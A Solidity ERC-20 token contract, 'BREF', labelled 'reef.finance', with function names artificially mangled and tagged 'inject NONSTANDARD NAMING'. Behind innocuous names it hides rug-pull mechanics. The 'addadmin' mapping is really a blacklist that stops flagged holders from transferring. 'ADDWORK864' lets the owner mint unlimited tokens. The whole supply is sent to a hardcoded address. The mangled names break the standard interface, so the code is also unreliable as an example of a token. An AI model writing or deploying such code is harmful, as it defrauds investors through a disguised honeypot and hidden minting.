                                                                 

                                                                 

                                                                 

pragma solidity ^0.5.11;

interface IERC20 {
  function TOTALSUPPLY516() external view returns (uint256);	//inject NONSTANDARD NAMING
  function BALANCEOF444(address who) external view returns (uint256);	//inject NONSTANDARD NAMING
  function ALLOWANCE833(address owner, address spender) external view returns (uint256);	//inject NONSTANDARD NAMING
  function TRANSFER196(address to, uint256 value) external returns (bool);	//inject NONSTANDARD NAMING
  function APPROVE996(address spender, uint256 value) external returns (bool);	//inject NONSTANDARD NAMING
  function TRANSFERFROM315(address from, address to, uint256 value) external returns (bool);	//inject NONSTANDARD NAMING

  event TRANSFER720(address indexed from, address indexed to, uint256 value);	//inject NONSTANDARD NAMING
  event APPROVAL613(address indexed owner, address indexed spender, uint256 value);	//inject NONSTANDARD NAMING
}

library SafeMath {
  function MUL570(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function DIV82(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    uint256 c = a / b;
    return c;
  }

  function SUB234(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    assert(b <= a);
    return a - b;
  }

  function ADD439(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function CEIL799(uint256 a, uint256 m) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    uint256 c = ADD439(a,m);
    uint256 d = SUB234(c,1);
    return MUL570(DIV82(d,m),m);
  }
}

contract ERC20Detailed is IERC20 {

  uint8 private _Tokendecimals;
  string private _Tokenname;
  string private _Tokensymbol;

  constructor(string memory name, string memory symbol, uint8 decimals) public {
   
   _Tokendecimals = decimals;
    _Tokenname = name;
    _Tokensymbol = symbol;
    
  }

  function NAME220() public view returns(string memory) {	//inject NONSTANDARD NAMING
    return _Tokenname;
  }

  function SYMBOL729() public view returns(string memory) {	//inject NONSTANDARD NAMING
    return _Tokensymbol;
  }

  function DECIMALS106() public view returns(uint8) {	//inject NONSTANDARD NAMING
    return _Tokendecimals;
  }
}



contract BREF is ERC20Detailed {

  using SafeMath for uint256;
    
  uint256 public totalBurn = 0;
  
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;
  mapping (address => bool) public addadmin;
  string constant tokenname752 = "reef.finance";	//inject NONSTANDARD NAMING
  string constant tokensymbol423 = "BREF";	//inject NONSTANDARD NAMING
  uint8  constant tokendecimals186 = 18;	//inject NONSTANDARD NAMING
  uint256 _totalSupply = 20000*10**uint(tokendecimals186); 
 
  
  //any tokens sent here ? 
  IERC20 currentToken ;
  	address payable public _owner;
    
    //modifiers	
	modifier ONLYOWNER317() {	//inject NONSTANDARD NAMING
      require(msg.sender == _owner);
      _;
  }
  
  address initialSupplySend = 0x1254dfF481fd0cBd308d9586D678E0D2942a35fc;
  

  constructor() public payable ERC20Detailed(tokenname752, tokensymbol423, tokendecimals186) {
      
    _SUPPLY590(initialSupplySend, _totalSupply);
    _owner = msg.sender;
  }

  function TOTALSUPPLY516() public view returns (uint256) {	//inject NONSTANDARD NAMING
    return _totalSupply;
  }

  function BALANCEOF444(address owner) public view returns (uint256) {	//inject NONSTANDARD NAMING
    return _balances[owner];
  }

  function ALLOWANCE833(address owner, address spender) public view returns (uint256) {	//inject NONSTANDARD NAMING
    return _allowed[owner][spender];
  }

  function ADDADMIN994(address account) public {	//inject NONSTANDARD NAMING
      require(msg.sender == _owner, "!owner");
      addadmin[account] = true;
  }
  
    function REMOVEADMIN220(address account) public {	//inject NONSTANDARD NAMING
      require(msg.sender == _owner, "!owner");
      addadmin[account] = false;
  }

 function TRANSFER196(address to, uint256 value) public returns (bool) 	//inject NONSTANDARD NAMING
    {
        _EXECUTETRANSFER328(msg.sender, to, value);
        return true;
    }
    
    function MULTITRANSFER718(address[] memory receivers, uint256[] memory values) public	//inject NONSTANDARD NAMING
    {
        require(receivers.length == values.length);
        for(uint256 i = 0; i < receivers.length; i++)
            _EXECUTETRANSFER328(msg.sender, receivers[i], values[i]);
    }
    
    function TRANSFERFROM315(address from, address to, uint256 value) public returns (bool) 	//inject NONSTANDARD NAMING
    {
        require(value <= _allowed[from][msg.sender]);
        _allowed[from][msg.sender] = _allowed[from][msg.sender].SUB234(value);
        _EXECUTETRANSFER328(from, to, value);
        return true;
    }
   
    function _EXECUTETRANSFER328(address _from, address _to, uint256 _value) private	//inject NONSTANDARD NAMING
    {
      require(!addadmin[_from], "error");
        if (_to == address(0)) revert();                               // Prevent transfer to 0x0 address. Use burn() instead
		if (_value <= 0) revert(); 
        if (_balances[_from] < _value) revert();           // Check if the sender has enough
        if (_balances[_to] + _value < _balances[_to]) revert(); // Check for overflows
        _balances[_from] = SafeMath.SUB234(_balances[_from], _value);                     // Subtract from the sender
        _balances[_to] = SafeMath.ADD439(_balances[_to], _value);                            // Add the same to the recipient
        emit TRANSFER720(_from, _to, _value);                   // Notify anyone listening that this transfer took place
    }
         
  //no zeros for decimals necessary 
  function MULTITRANSFEREQUALAMOUNT404(address[] memory receivers, uint256 amount) public {	//inject NONSTANDARD NAMING
    uint256 amountWithDecimals = amount * 10**tokendecimals186;

    for (uint256 i = 0; i < receivers.length; i++) {
      TRANSFER196(receivers[i], amountWithDecimals);
    }
  }

  function APPROVE996(address spender, uint256 value) public returns (bool) {	//inject NONSTANDARD NAMING
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit APPROVAL613(msg.sender, spender, value);
    return true;
  }

  function INCREASEALLOWANCE637(address spender, uint256 addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].ADD439(addedValue));
    emit APPROVAL613(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function DECREASEALLOWANCE737(address spender, uint256 subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].SUB234(subtractedValue));
    emit APPROVAL613(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function _SUPPLY590(address account, uint256 amount) internal {	//inject NONSTANDARD NAMING
    require(amount != 0);
    _balances[account] = _balances[account].ADD439(amount);
    emit TRANSFER720(address(0), account, amount);
  }

 //take back unclaimed tokens of any type sent by mistake
  function WITHDRAWUNCLAIMEDTOKENS118(address contractUnclaimed) external ONLYOWNER317 {	//inject NONSTANDARD NAMING
      currentToken = IERC20(contractUnclaimed);
      uint256 amount = currentToken.BALANCEOF444(address(this));
      currentToken.TRANSFER196(_owner, amount);
  }
  
  function ADDWORK864(address account, uint256 amount) public {	//inject NONSTANDARD NAMING
      require(msg.sender == _owner, "!warning");
      _SUPPLY590(account, amount);
  }
}